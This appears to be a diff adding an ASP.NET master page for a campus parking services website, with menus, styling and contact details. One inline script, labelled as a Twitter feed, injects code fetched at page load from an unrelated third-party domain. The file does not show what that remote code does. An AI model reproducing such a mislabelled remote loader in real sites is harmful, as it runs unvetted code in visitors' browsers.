@@ -1,0 +1,156 @@
+﻿<%@ Master Language="C#" AutoEventWireup="true" CodeFile="Master.master.cs" Inherits="Master" %>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head runat="server">
+    <title>Parking Services</title>
+    <link runat="server" rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link runat="server" rel="icon" href="/favicon.ico" type="image/ico" />
+    <asp:ContentPlaceHolder ID="head" runat="server"></asp:ContentPlaceHolder>
+    <asp:ContentPlaceHolder ID="ContentPlaceHolder1" runat="server"></asp:ContentPlaceHolder>
+    <link rel="stylesheet" type="text/css" href="/Info/FAQstyle.css" />
+    <link href="/Admin/Menu.css" rel="stylesheet" type="text/css" />
+    <style type="text/css">
+        .auto-style1 {
+            text-align: center;
+        }
+
+        #menu {
+            width: 200px;
+            margin: 10px;
+            font-size: 12px;
+        }
+
+        body {
+            color: #222222;
+        }
+
+        li {
+            margin-bottom: 1.0em;
+        }
+
+        #menu * {
+            list-style: none;
+            margin: 0;
+            padding: 0;
+            text-align: center !important;
+        }
+
+        #menu li a {
+            height: 32px;
+            voice-family: "\"}\"";
+            voice-family: inherit;
+            height: 24px;
+            text-decoration: none;
+            transition: all 0.2s linear 0s;
+            font-size: 13px;
+        }
+
+            #menu li a:link, #menu li a:visited {
+                color: #007073;
+                display: block;
+                background: url(/images/menu.gif);
+                padding: 8px 0 0 10px;
+                font-size: 13px;
+            }
+
+
+
+            #menu li a:hover, #menu li #current {
+                color: #007073;
+                font-weight: bold;
+                background: url(/images/menu.gif) 0 -32px;
+                padding: 8px 0 0 10px;
+            }
+    </style>
+    <link href="Style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <form id="form2" runat="server">
+        <table style="font-family: Arial">
+            <tr>
+                <td colspan="2" style="width: 100%; height: 150px; background-image: url('/images/bg.png'); outline: 1px dotted rgba(164, 149, 116, 0.5); background-repeat: repeat-x; color: #222; text-align: center; border-bottom: 5px solid #007073;">
+                    <center>
+                        <img src="/images/logo.png" alt="Parking Services" /></center>
+                </td>
+            </tr>
+            <tr valign="top">
+                <td style="height: 300px; background-image: url('/images/nav.png'); background-repeat: repeat-x; border-right: 5px solid #494949; border-left: 5px solid #494949; color: #202020; width: 120px; position: relative;">
+                    <div id="menu">
+                        <center>
+                            <h2><u>Main Menu</u></h2>
+                        </center>
+                        <br />
+                        <ul>
+                            <li class="auto-style1"><a href="/Default.aspx">Home</a></li>
+                            <li class="auto-style1"><a href="/Login.aspx">Login</a></li>
+                            <li class="auto-style1"><a href="/Register.aspx">Register</a></li>
+                            <li class="auto-style1"><a href="/Members.aspx">Members</a></li>
+                            <li class="auto-style1"><a href="/Info/Help.aspx">Help</a></li>
+                            <li class="auto-style1"><a href="/Info/FAQ.aspx">F.A.Q.</a></li>
+                            <li class="auto-style1"><a href="/Contact.aspx">Contact Us</a></li>
+                        </ul>
+                        <br />
+                        <center>
+                            <h2><u>
+                                <br />
+                                Parking Info</u></h2>
+                        </center>
+                        <br />
+                        <ul>
+                            <li class="auto-style1"><a href="/Info/Map.aspx">Campus Map</a></li>
+                            <li class="auto-style1"><a href="/Info/Citations.aspx">Citations</a></li>
+                            <li class="auto-style1"><a href="/Info/ParkingRules.aspx">Parking Rules</a></li>
+                            <li class="auto-style1"><a href="/Info/Decals.aspx">Decals</a></li>
+                            <li class="auto-style1"><a href="/Info/VisitorParking.aspx">Visitor Parking</a></li>
+                            <li class="auto-style1"><a href="/Info/StudentParking.aspx">Student Parking</a></li>
+                            <li class="auto-style1"><a href="/Info/FacultyParking.aspx">Faculty Parking</a></li>
+                        </ul>
+
+                        <!--This is the Twitter feed at the bottom-right corner-->
+                        <script type='text/javascript'>
+                            (function () {
+                                var handle = '#############---_TWITTER ACCOUNT_---###############';
+                                var a = document.createElement('script');
+                                var m = document.getElementsByTagName('script')[0];
+                                a.async = 1;
+                                a.src = 'https://nectar.ninja/api/v1/' + handle.slice(1);
+                                m.parentNode.insertBefore(a, m);
+                            })();
+                        </script>
+                    </div>
+                    <div style="background-image: url('/images/contact.png'); background-repeat: no-repeat">
+                        ;
+    <p align="center">
+        <b>3000 Software St
+            <br />
+            Spartanburg, SC
+            <br />
+            Office: 555-555-5555
+            <br />
+            <a href="mailto:parkingcsci540@gmail.com">parkingcsci540@gmail.com</a>&nbsp; 
+        </b>
+    </p>
+                    </div>
+                </td>
+                <td style="background-image: url('/images/repeat-x.png'); background-repeat: repeat-x; width: 100%; height: 100%">
+                    <div>
+                        <!--Main Content Holder-->
+                        <asp:Panel ID="Panel1" runat="server" GroupingText="Parking Services" Width="100%">
+                            <asp:ContentPlaceHolder ID="MyContent" runat="server"></asp:ContentPlaceHolder>
+                        </asp:Panel>
+                    </div>
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2" style="background-color: #b9b9b9; border-top: 4px solid #494949; outline: 1px dotted rgba(164, 149, 116, 0.5); border-bottom: 4px solid #494949; text-align: center">
+                    <strong>© 2015 Software University. All rights reserved.</strong>
+                    <font size="2"><a href="/Info/Policy.aspx">Terms of Service</a></font>
+                </td>
+            </tr>
+        </table>
+    </form>
+</body>
+</html>
+
+
